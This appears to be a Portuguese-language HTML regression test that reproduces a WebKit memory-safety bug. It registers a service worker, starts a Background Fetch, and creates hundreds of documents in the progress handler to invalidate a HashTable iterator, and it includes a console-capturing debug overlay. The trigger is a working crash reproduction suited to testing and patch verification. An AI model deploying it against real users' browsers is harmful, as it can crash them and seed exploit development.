<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
(function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] Não foi possível carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
</script>
<button id="start">Iniciar teste (requer HTTPS ou localhost)</button>
<pre id="log"></pre>
<script>
const logEl = document.getElementById('log');
function log(msg, color = '#fff') {
  const d = document.createElement('div');
  d.style.color = color;
  d.textContent = msg;
  logEl.appendChild(d);
}

// Service Worker mínimo (equivalente ao change-documents-in-progress-event-sw.js do commit)
const SW_SOURCE = `
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => self.clients.claim());
`;

async function runTest() {
  if (!('serviceWorker' in navigator)) {
    log('Service Worker indisponível — skip', '#f80');
    return;
  }
  if (!('backgroundFetch' in (await navigator.serviceWorker.ready).registration || {})) {
    log('Background Fetch API indisponível — skip', '#f80');
    return;
  }

  // Pre-populate allDocumentsMap so the matching Document is not the only entry.
  let preDocs = [];
  for (let i = 0; i < 8; i++)
    preDocs.push(document.implementation.createHTMLDocument());

  const swBlob = new Blob([SW_SOURCE], { type: 'application/javascript' });
  const swUrl = URL.createObjectURL(swBlob);

  const swr = await navigator.serviceWorker.register(swUrl, { scope: './' });
  await navigator.serviceWorker.ready;

  const request = await swr.backgroundFetch.fetch(
    'repro-' + Date.now(),
    ['/favicon.ico'] // qualquer recurso same-origin servível
  );

  let newDocs = [];
  let fired = false;

  let resolveCallback;
  const promise = new Promise(resolve => resolveCallback = resolve);

  request.onprogress = () => {
    if (fired) return;
    fired = true;
    log('progress disparado — criando 512 documentos para invalidar o iterador do HashTable…', '#0f0');
    for (let i = 0; i < 512; i++)
      newDocs.push(document.implementation.createHTMLDocument());
    resolveCallback();
  };

  await promise;
  log('PASS — nenhum crash (se o WebKit for corrigido) ou crash silencioso (se vulnerável)', '#0f0');
}

document.getElementById('start').addEventListener('click', () => {
  logEl.innerHTML = '';
  runTest().catch(e => log('ERRO: ' + e.message, '#f55'));
});
</script>
</body>
</html>
